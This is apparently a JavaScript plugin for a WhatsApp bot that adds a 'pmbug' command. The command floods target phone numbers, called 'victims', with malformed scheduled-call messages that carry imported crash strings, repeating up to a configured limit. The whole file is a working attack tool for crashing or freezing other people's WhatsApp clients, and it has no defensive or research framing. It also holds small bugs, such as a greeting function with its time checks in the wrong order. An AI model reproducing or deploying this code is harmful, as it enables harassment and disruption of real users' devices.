const { zokou } = require("../framework/zokou");
const { delay, loading, react } = require("../framework/utils");
const moment = require("moment-timezone");
const conf = require("../set.js");
const fs = require("fs");
const path = require("path");
const {
    generateWAMessageFromContent,
    proto
} = require("@whiskeysockets/baileys");

// bug database
const { bugtext1 } = require("../framework/bug/bugtext1");
const { bugtext2 } = require("../framework/bugs/bugtext2");
const { bugtext3 } = require("../framework/bug/bugtext3");
const { bugtext4 } = require("../framework/bug/bugtext4");
const { bugtext5 } = require("../framework/bug/bugtext5");
const { bugtext6 } = require("../framework/bug/bugtext6");
const { bugpdf } = require("../framework/bug/bugpdf.js");

const category = "Bug-cmds";
const reaction = "🤯";

const mess = {};
mess.prem = "You are not authorised to use this  command !!!";

const phoneRegex = /^\d{1,3}[- ]?(\(\d{1,3}\) )?[\d- ]{7,10}$/;
const whatsappRegex =
    /https:\/\/chat\.whatsapp\.com\/(invite|join|)[A-Za-z0-9]+/;

const timewisher = time => {
    if (time < "23:59:00") {
        return `Good Night 🌆`;
    } else if (time < "19:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "18:00:00") {
        return `Good Evening 🌆`;
    } else if (time < "15:00:00") {
        return `Good Afternoon 🌅`;
    } else if (time < "11:00:00") {
        return `Good Morning 🌄`;
    } else if (time < "05:00:00") {
        return `Good Morning 🌄`;
    }
};

async function relaybug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            for (let j = 0; j < amount; j++) {
                var scheduledCallCreationMessage = generateWAMessageFromContent(
                    dest,
                    proto.Message.fromObject(bug),
                    { userJid: dest, quoted: ms }
                );
                try {
                    zk.relayMessage(
                        victim,
                        scheduledCallCreationMessage.message,
                        { messageId: scheduledCallCreationMessage.key.id }
                    );
                } catch (e) {
                    repondre(
                        `An error occured while sending bugs to ${victims[i]}`
                    );
                    console.log(
                        `An error occured while sending bugs to ${victim}: ${e}`
                    );
                    break;
                }
                await delay(3000);
            }
            if (victims.length > 1)
                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
            await delay(5000);
        }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}

async function sendbug(dest, zk, ms, repondre, amount, victims, bug) {
    for (let i = 0; i < victims.length; i++) {
        if (!phoneRegex.test(victims[i])) {
            repondre(`${victims[i]} not a valid phone number`);
            continue;
        } else {
            const victim = victims[i] + "@s.whatsapp.net";
            for (let j = 0; j < amount; j++) {
                try {
                    zk.sendMessage(victim, bug);
                } catch (e) {
                    repondre(
                        `An error occured while sending bugs to ${victims[i]}`
                    );
                    console.log(
                        `An error occured while sending bugs to ${victim}: ${e}`
                    );
                    break;
                }
                await delay(3000);
            }
            if (victims.length > 1)
                repondre(`${amount} bugs send to ${victims[i]} Successfully.`);
            await delay(5000);
        }
    }
    repondre(`Successfully sent ${amount} bugs to ${victims.join(", ")}.`);
}


zokou(
    {
        nomCom: "pmbug",
        categorie: category,
        reaction: reaction
    },

    async (dest, zk, commandOptions) => {
        const { ms, arg, repondre, superUser, prefixe } = commandOptions;
        if (!superUser) return await repondre(mess.prem);
        if (!arg[0])
            return await repondre(
                `Use ${prefixe}pmbug amount | numbers\n> Example ${prefixe}pmbug 30 |${
                    conf.NUMERO_OWNER
                } or ${prefixe}pmbug ${conf.NUMERO_OWNER.split(",")[0]}`
            );
        await loading(dest, zk);
        const text = arg.join("");
        let amount = 30;
        let victims = [];
        const bug = {
            scheduledCallCreationMessage: {
                callType: "2",
                scheduledTimestampMs: `${moment(1000)
                    .tz("Asia/Kolkata")
                    .format("DD/MM/YYYY HH:mm:ss")}`,
                title: `${bugtext1}`
            }
        };
        if (arg.length === 1) {
            victims.push(arg[0]);
            await repondre(`sending ${amount} bugs to ${victims[0]}`);
            try {
                await relaybug(dest, zk, ms, repondre, amount, victims, bug);
            } catch (e) {
                await repondre("An error occured");
                console.log(`An error occured: ${e}`);
                await react(dest, zk, ms, "⚠️");
            }
        } else {
            amount = parseInt(text.split("|")[0].trim());
            if (
                amount > conf.BOOM_MESSAGE_LIMIT ||
                isNaN(amount) ||
                amount < 1
            ) {
                return await repondre(
                    `amount must be a valid intiger between 1-${conf.BOOM_MESSAGE_LIMIT}`
                );
            } else {
                victims = text
                    .split("|")[1]
                    .split(",")
                    .map(x => x.trim())
                    .filter(x => x !== "");
                if (victims.length > 0) {
                    await repondre(
                        `sending ${amount} bugs to ${victims.join(", ")}`
                    );
                    try {
                        await relaybug(
                            dest,
                            zk,
                            ms,
                            repondre,
                            amount,
                            victims,
                            bug
                        );
                    } catch (e) {
                        await repondre("An error occured");
                        console.log(`An error occured: ${e}`);
                        await react(dest, zk, ms, "⚠️");
                    }
                } else {
                    return await repondre("No victims specfied");
                }
            }
        }
        await react(dest, zk, ms, "✅");
    }
);
